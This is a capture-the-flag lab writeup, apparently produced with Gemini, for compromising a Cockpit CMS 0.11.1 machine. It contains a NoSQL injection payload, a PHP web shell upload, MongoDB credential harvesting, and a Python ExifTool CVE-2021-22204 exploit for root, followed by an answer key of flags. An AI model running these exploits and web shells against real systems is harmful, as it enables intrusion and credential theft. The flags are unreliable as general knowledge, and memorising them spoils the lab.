# CMSpit CTF Writeup
(*re-solved by gemini 🤖🤖🤖*)
## 1. Enumeration

Target IP: `10.49.150.131`

Initial scan with Nmap:
```bash
nmap -sV -sC 10.49.150.131
```
Port 80 revealed **Cockpit CMS version 0.11.1**.

## 2. Vulnerability Research

Searching for vulnerabilities in Cockpit CMS 0.11.1 using `searchsploit`:
```bash
searchsploit cockpit
```
Found **Exploit 50185.py**: Cockpit CMS 0.11.1 - 'Username Enumeration & Password Reset' NoSQL Injection (CVE-2020-35846, CVE-2020-35847, CVE-2020-35848).

## 3. Exploitation - Gaining CMS Access

### User Enumeration
Using NoSQL injection via the `$func` operator to dump usernames:
```bash
curl -s -X POST -H "Content-Type: application/json" -d '{"user":{"$func":"var_dump"}}' http://10.49.150.131/auth/requestreset
```
Output:
- `admin`
- `darkStar7471`
- `skidy`
- `ekoparty`

### Password Reset
Exploiting the NoSQL injection at `/auth/resetpassword` to reset Skidy's password.
Skidy's email: `skidy@tryhackme.fakemail`

## 4. Foothold - Remote Code Execution

### Finding the Upload Endpoint
By inspecting the JavaScript source of the `Finder` module (`/storage/tmp/426ecd8107d31ebb5a92b6dec7d8c468.js`), I identified the `/media/api` endpoint and the `upload` command.

### Uploading a Web Shell
Logged in as Skidy and uploaded a PHP shell:
```bash
echo "<?php system(\"
$_GET['cmd']
\"); ?>" > /tmp/shell_new.php
curl -s -b cookies.txt -X POST -F "cmd=upload" -F "path=/" -F "files[]=@/tmp/shell_new.php" http://10.49.150.131/media/api
```
Successfully uploaded to `http://10.49.150.131/shell_new.php`.

### Web Flag
```bash
curl -s "http://10.49.150.131/shell_new.php?cmd=cat%20webflag.php"
```
**Web Flag:** `thm{f158bea70731c48b05657a02aaf955626d78e9fb}`

## 5. Post-Exploitation - Document Database

### Enumerating MongoDB
The system info showed a document database. I used the web shell to interact with the local MongoDB instance.
```bash
mongo sudousersbak --eval "printjson(db.getCollectionNames())"
```
Collections: `flag`, `user`.

Reading the flags:
```bash
mongo sudousersbak --eval "printjson(db.flag.find().toArray())"
```
**Database Flag:** `thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}`

### Harvesting Credentials
```bash
mongo sudousersbak --eval "printjson(db.user.find().toArray())"
```
Found user `stux` with password `p4ssw0rdhack3d!123`.

## 6. System Access

Logging in via SSH:
```bash
ssh stux@10.49.150.131
cat user.txt
```
**User Flag:** `thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}`

## 7. Privilege Escalation

### Sudo Privileges
```bash
sudo -l
```
User `stux` can run `/usr/local/bin/exiftool` as root without a password.

### CVE-2021-22204
ExifTool 12.05 is vulnerable to arbitrary code execution when parsing DjVu metadata in images.

Exploit script (`exploit_exif.py`):
```python
import base64
import os
import subprocess
import sys

def exploit(command):
    payload = "(metadata \"\c$" + command + "};")"
    with open('payload','w') as f: f.write(payload)
    subprocess.call(['bzz', 'payload', 'payload.bzz'])
    subprocess.call(['djvumake', 'exploit.djvu', "INFO=1,1", 'BGjp=/dev/null', 'ANTz=payload.bzz'])
    image = b"/9j/4AAQSkZJRgABAQEASABIAAD/2wBDAAMCAgICAgMCAgIDAwMDBAYEBAQEBAgGBgUGCQgKCgkICQkKDA8MCgsOCwkJDRENDg8QEBEQCgwSExIQEw8QEBD/yQALCAABAAEBAREA/8wABgAQEAX/2gAIAQEAAD8A0s8g/9k="
    with open("image.jpg", "wb") as img: img.write(base64.b64decode(image))
    config = "%Image::ExifTool::UserDefined = ( 'Image::ExifTool::Exif::Main' => { 0xc51b => { Name => 'HasselbladExif', Writable => 'string', WriteGroup => 'IFD0', }, }, ); 1;"
    with open('exiftool.config','w') as f: f.write(config)
    subprocess.call(['exiftool','-config','exiftool.config','-HasselbladExif<=exploit.djvu','image.jpg','-overwrite_original_in_place','-q'])
```

### Executing the Exploit
```bash
python3 exploit_exif.py 'cp /root/root.txt /tmp/root.txt && chmod 644 /tmp/root.txt'
sudo /usr/local/bin/exiftool image.jpg
cat /tmp/root.txt
```
**Root Flag:** `thm{bf52a85b12cf49b9b6d77643771d74e90d4d5ada}`

---

## Questions and Answers

1. **What is the name of the Content Management System (CMS) installed on the server?**
   Cockpit

2. **What is the version of the Content Management System (CMS) installed on the server?**
   0.11.1

3. **What is the path that allow user enumeration?**
   /auth/check

4. **How many users can you identify when you reproduce the user enumeration attack?**
   4

5. **What is the path that allows you to change user account passwords?**
   /auth/resetpassword

6. **Compromise the Content Management System (CMS). What is Skidy's email?**
   skidy@tryhackme.fakemail

7. **What is the web flag?**
   thm{f158bea70731c48b05657a02aaf955626d78e9fb}

8. **Compromise the machine and enumerate collections in the document database installed in the server. What is the flag in the database?**
   thm{c3d1af8da23926a30b0c8f4d6ab71bf851754568}

9. **What is the user.txt flag?**
   thm{c5fc72c48759318c78ec88a786d7c213da05f0ce}

10. **What is the CVE number for the vulnerability affecting the binary assigned to the system user?**
    CVE-2021-22204

11. **What is the utility used to create the PoC file?**
    djvumake

12. **Escalate your privileges. What is the flag in root.txt?**
    thm{bf52a85b12cf49b9b6d77643771d74e90d4d5ada}
